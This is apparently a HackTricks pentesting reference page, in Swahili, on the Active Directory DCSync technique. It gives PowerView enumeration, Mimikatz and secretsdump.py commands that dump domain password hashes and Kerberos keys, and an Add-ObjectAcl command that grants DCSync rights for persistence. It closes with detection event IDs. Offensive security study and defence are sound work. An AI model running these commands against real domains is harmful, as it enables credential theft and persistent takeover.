# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

Ruhusa la **DCSync** linamaanisha kuwa na ruhusa hizi juu ya eneo lenyewe: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** na **Replicating Directory Changes In Filtered Set**.

**Maelezo Muhimu Kuhusu DCSync:**

- **Shambulio la DCSync linaiga tabia ya Kituo cha Kikoa na linaomba Kituo kingine cha Kikoa kuiga taarifa** kwa kutumia Protokali ya Huduma ya Kuiga Katalogi ya Mbali (MS-DRSR). Kwa sababu MS-DRSR ni kazi halali na muhimu ya Active Directory, haiwezi kuzuiliwa au kuzimwa.
- Kwa kawaida, ni **Wakosoaji wa Kikoa, Wakosoaji wa Biashara, Wasimamizi, na Vikundi vya Kituo cha Kikoa** pekee vina ruhusa zinazohitajika.
- Ikiwa nywila za akaunti yoyote zimehifadhiwa kwa usimbaji wa kurudi nyuma, chaguo linapatikana katika Mimikatz kurudisha nywila hiyo kwa maandiko wazi.

### Enumeration

Angalia ni nani ana ruhusa hizi kwa kutumia `powerview`:
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
### Fanya Uhalifu Kwenye Kihisia
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Fanya Uhalifu kwa Mbali
```powershell
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-pwd-last-set] #To see when each account's password was last changed
[-history] #To dump password history, may be helpful for offline password cracking
```
`-just-dc` inazalisha faili 3:

- moja ikiwa na **NTLM hashes**
- moja ikiwa na **Kerberos keys**
- moja ikiwa na nywila za wazi kutoka NTDS kwa akaunti zozote zilizowekwa na [**reversible encryption**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) iliyowezeshwa. Unaweza kupata watumiaji wenye reversible encryption kwa

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Persistence

Ikiwa wewe ni admin wa domain, unaweza kutoa ruhusa hii kwa mtumiaji yeyote kwa msaada wa `powerview`:
```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Kisha, unaweza **kuangalia kama mtumiaji amepewa** haki 3 kwa kutafuta katika matokeo ya (unapaswa kuwa na uwezo wa kuona majina ya haki ndani ya uwanja wa "ObjectType"):
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Kupunguza

- Security Event ID 4662 (Sera ya Ukaguzi kwa kitu lazima iwekwe) – Operesheni ilifanyika kwenye kitu
- Security Event ID 5136 (Sera ya Ukaguzi kwa kitu lazima iwekwe) – Kitu cha huduma ya directory kilibadilishwa
- Security Event ID 4670 (Sera ya Ukaguzi kwa kitu lazima iwekwe) – Ruhusa kwenye kitu zilibadilishwa
- AD ACL Scanner - Unda na kulinganisha ripoti za ACLs. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## Marejeleo

- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)

{{#include ../../banners/hacktricks-training.md}}
